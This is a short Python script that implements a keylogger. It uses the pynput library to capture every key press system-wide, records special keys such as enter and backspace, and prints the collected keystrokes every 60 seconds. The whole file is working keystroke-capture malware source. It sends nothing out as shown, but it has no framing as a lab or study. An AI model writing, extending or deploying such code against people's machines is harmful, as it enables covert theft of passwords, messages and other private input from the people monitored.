#!/usr/bin/env python3
import pynput.keyboard
import threading

log = ""

class Keylogger:
	def process_key_press(self,key):
		global log
		try:
			log = log + str(key.char)
		except AttributeError:
			if key == key.space:
				log = log + " "
				# print(log)
			elif key == key.tab:
				log = log + " Tab "
			elif key== key.enter:
				log = log + " enter "
			elif key==key.backspace:
				log = log + " backspace "
			else:
				log =  log + str(key)


	def report(self):
		global log
		print(log)
		log = ""
		timer = threading.Timer(60, self.report)
		timer.start()
			
	def start(self):		
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

